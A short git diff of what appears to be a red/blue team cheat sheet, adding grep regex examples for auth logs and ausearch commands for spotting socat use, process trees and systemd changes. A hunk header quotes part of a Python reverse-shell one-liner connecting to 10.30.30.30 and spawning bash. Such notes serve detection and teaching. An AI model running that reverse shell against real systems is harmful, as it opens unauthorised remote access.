@@ -12,7 +12,7 @@ grep -E "Failed|Accepted" /var/log/auth.log
 #(znajdzie próby logowania udane i nieudane).
 ```
 
-+ (Jeden lub więcej): Dopasowuje co najmniej jedno wystąpienie poprzedniego znaku.
+\+ (Jeden lub więcej): Dopasowuje co najmniej jedno wystąpienie poprzedniego znaku.
 ```
 grep -E "log+"
 #(znajdzie "log", "logg", "loggg").
@@ -58,8 +58,16 @@ python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'
 ```
 
 # Blue
+## Ausearch
 ```
 ausearch -i -x socat # Look for suspicious commands
+```
+```
 ausearch -i --pid 27806 # Find its parent process and build a process tree
+```
+```
 ausearch -i --ppid 27808 | grep proctitle # List all its child processes
+```
+```
+ausearch -i -f /etc/systemd # Look for file changes inside /etc/systemd
 ```
